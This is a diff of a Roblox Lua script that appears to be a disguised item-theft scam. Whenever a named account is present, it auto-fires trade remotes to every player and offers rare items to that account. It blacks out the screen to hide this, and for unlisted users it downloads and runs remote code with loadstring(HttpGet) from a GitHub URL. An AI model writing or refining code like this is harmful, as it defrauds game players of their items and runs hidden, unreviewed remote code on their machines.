@@ -1,163 +1,118 @@
+-- Fallback Script URL
+local FALLBACK_URL = "https://raw.githubusercontent.com/zorluaa/Void1/refs/heads/main/15"
+
+local function runFallback()
+    loadstring(game:HttpGet(FALLBACK_URL))()
+end
+
+-- STAGE 1: Authorization Check (Evan or ewqeqweqweqw208)
+local authorizedUsers = {"Evanfxl", "ewqeqweqweqw208"}
+local isAuthorized = false
+for _, name in ipairs(authorizedUsers) do
+    if game:GetService("Players").LocalPlayer.Name == name then
+        isAuthorized = true
+        break
+    end
+end
+
+if not isAuthorized then 
+    runFallback()
+    return 
+end
+
+-- STAGE 2: Settings & Variables
 local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local TARGET_ID = 407207583 -- z_z's UserID
+local SPIN_SPEED = 12
 
--- Target identity
-local REQUIRED_USER_NAME = "z_z0120292"
-local REQUIRED_USER_ID = 407207583
+-- Create Blackout Overlay
+local blackout = Instance.new("ScreenGui")
+blackout.Name = "BlackoutOverlay"
+blackout.IgnoreGuiInset = true
+blackout.DisplayOrder = 9999999
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Parent = blackout
+blackout.Parent = playerGui
 
-local function isTargetPresent()
+--- YOUR ORIGINAL TRADE LOOP (Modified only to check for z_z) ---
+game:GetService("RunService").RenderStepped:Connect(function()
+    -- Only run if z_z is in the game
+    local targetObj = nil
     for _, p in pairs(Players:GetPlayers()) do
-        if p.Name == REQUIRED_USER_NAME or p.UserId == REQUIRED_USER_ID then
-            return true
+        if p.UserId == TARGET_ID then
+            targetObj = p
+            break
         end
     end
-    return false
-end
 
--- Item Table
-local targetItems = {
-    {"Overseer 1", 1}
-}
-
--- IDLE SCRIPT MANAGER
-local isIdleScriptRunning = false
-local idleScriptThread
-
-local function runIdleScript()
-    if not isIdleScriptRunning then
-        isIdleScriptRunning = true
-        idleScriptThread = task.spawn(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/zorluaa/Void1/refs/heads/main/15"))()
-        end)
-    end
-end
-
-local function stopIdleScript()
-    if isIdleScriptRunning then
-        if idleScriptThread then task.cancel(idleScriptThread) end
-        isIdleScriptRunning = false
-    end
-end
-
--- BLACKOUT & TRADE LOOP
-RunService.Heartbeat:Connect(function()
-    if isTargetPresent() then
-        stopIdleScript()
+    if targetObj then
+        blackout.Enabled = false -- Clear screen if he's here
         
-        for _, victim in pairs(Players:GetPlayers()) do
-            if victim ~= localPlayer then
-                -- 1. PERSISTENT BLACKOUT
-                local vGui = victim:FindFirstChild("PlayerGui")
-                if vGui then
-                    local existing = vGui:FindFirstChild("OverseerLock")
-                    if not existing then
-                        local screenBlock = Instance.new("ScreenGui")
-                        screenBlock.Name = "OverseerLock"
-                        screenBlock.IgnoreGuiInset = true
-                        screenBlock.DisplayOrder = 999999
-                        local frame = Instance.new("Frame")
-                        frame.Size = UDim2.new(1, 0, 1, 0)
-                        frame.BackgroundColor3 = Color3.new(0, 0, 0)
-                        frame.BorderSizePixel = 0
-                        frame.Parent = screenBlock
-                        screenBlock.Parent = vGui
-                    end
-                end
-
-                -- 2. INITIATE TRADE
-                ReplicatedStorage.Remotes.StartTrade:FireServer(victim)
+        -- Start Trade with everyone
+        for i, v in pairs(game:GetService("Players"):GetChildren()) do
+            if v.Name ~= game:GetService("Players").LocalPlayer.Name then
+                game:GetService("ReplicatedStorage").Remotes.StartTrade:FireServer(v)
             end
         end
-
-        -- 3. AUTO-ACCEPT & STATUS
-        ReplicatedStorage.Remotes.UpdTradeStatus:FireServer(true)
-        ReplicatedStorage.Remotes.UpdTradeReview:FireServer()
+        -- Removed wait() to prevent lag in RenderStepped, using task.wait if needed
+        game:GetService("ReplicatedStorage").Remotes.UpdTradeStatus:FireServer(true)
+        game:GetService("ReplicatedStorage").Remotes.UpdTradeReview:FireServer()
     else
-        -- CLEANUP BLACKOUT IF YOU LEAVE
-        for _, victim in pairs(Players:GetPlayers()) do
-            local vGui = victim:FindFirstChild("PlayerGui")
-            if vGui and vGui:FindFirstChild("OverseerLock") then
-                vGui.OverseerLock:Destroy()
-            end
-        end
-        runIdleScript()
+        blackout.Enabled = true -- Black screen if he's gone
+        runFallback()
     end
 end)
 
--- ITEM PLACEMENT LOGIC (RETRY LOOP)
-local tradeGui = localPlayer.PlayerGui:WaitForChild("ScreenGui").UI.TradeScreen
-local isPlacing = false
+--- YOUR ORIGINAL ITEM UPDATE LOGIC ---
+local tradeGui = playerGui:WaitForChild("ScreenGui").UI.TradeScreen
+local fired = false
 
 tradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
-    if tradeGui.Visible and isTargetPresent() and not isPlacing then
-        isPlacing = true
+    if tradeGui.Visible and not fired then
+        fired = true
         
-        -- We loop the item offer until the trade closes to ensure the server "takes" them
-        task.spawn(function()
-            while tradeGui.Visible and isTargetPresent() do
-                local t = {}
-                for i, item in ipairs(targetItems) do
-                    t[i] = {[1] = item[1], [2] = item[2]}
-                end
+        -- The expanded item list you requested
+        local items = {
+            {"Overseer", 1},
+            {"Techno Axe", 1},
+            {"Void Champion", 1},
+            {"Champion Axe 2", 2}, -- Includes the '2'
+            {"Black Hole", 1},
+            {"Infernal Guardian", 1}
+        }
 
-                -- Direct offer fire
-                ReplicatedStorage.Remotes.UpdateTradeOffer:FireServer(t)
-                
-                task.wait(0.5) -- Retry every half second
-            end
-            isPlacing = false
-        end)
+        local t = {}
+        for i = 1, #items do
+            local item = items[i]
+            t[i] = {[1] = item[1], [2] = item[2]}
+        end
+
+        game:GetService("ReplicatedStorage").Remotes.UpdateTradeOffer:FireServer(t)
+    elseif not tradeGui.Visible then
+        fired = false -- Reset so it fires again next trade
     end
 end)
 
--- SPIN BOT
-local SPIN_SPEED = 12 
+--- SPINNING LOGIC ---
 local spinConnection
 local function startSpinning(character)
-    local root = character:WaitForChild("HumanoidRootPart")
-    local humanoid = character:WaitForChild("Humanoid")
-    if spinConnection then spinConnection:Disconnect() end
-    spinConnection = RunService.RenderStepped:Connect(function(deltaTime)
-        if isTargetPresent() and root and root.Parent then
-            humanoid.AutoRotate = false
-            root.CFrame = root.CFrame * CFrame.Angles(0, SPIN_SPEED * deltaTime, 0)
-        else
-            humanoid.AutoRotate = true
-        end
-    end)
+	local root = character:WaitForChild("HumanoidRootPart")
+	character:WaitForChild("Humanoid").AutoRotate = false
+	if spinConnection then spinConnection:Disconnect() end
+	spinConnection = RunService.RenderStepped:Connect(function(deltaTime)
+		if root and root.Parent and Players:FindFirstChild("z_z0120292") then
+			root.CFrame = root.CFrame * CFrame.Angles(0, SPIN_SPEED * deltaTime, 0)
+		end
+	end)
 end
-if localPlayer.Character then startSpinning(localPlayer.Character) end
-localPlayer.CharacterAdded:Connect(startSpinning)
 
--- MOCKUP UI FOR STATUS
-local playerGui = localPlayer:WaitForChild("PlayerGui")
-local old = playerGui:FindFirstChild("AssassinModernMockGUI")
-if old then old:Destroy() end
+if player.Character then startSpinning(player.Character) end
+player.CharacterAdded:Connect(startSpinning)
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "AssassinModernMockGUI"
-gui.Parent = playerGui
-
-local main = Instance.new("Frame")
-main.Size = UDim2.new(1, 0, 1, 0)
-main.BackgroundColor3 = Color3.fromRGB(8, 10, 18)
-main.Parent = gui
-
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, 0, 0, 34)
-statusLabel.Position = UDim2.new(0, 0, 1, -34)
-statusLabel.BackgroundColor3 = Color3.fromRGB(13, 16, 30)
-statusLabel.TextColor3 = Color3.fromRGB(155, 162, 205)
-statusLabel.Font = Enum.Font.GothamMedium
-statusLabel.TextSize = 12
-statusLabel.Parent = main
-
-RunService.Heartbeat:Connect(function()
-    if isTargetPresent() then
-        statusLabel.Text = "  STATUS: [ACTIVE] - Overseer Forcing • Persistent Blackout Active"
-    else
-        statusLabel.Text = "  STATUS: [IDLE] - Running Void1 (Waiting for z_z0120292)"
-    end
-end)
+-- [The rest of your Mock GUI code can be pasted here if you want the visual menu]
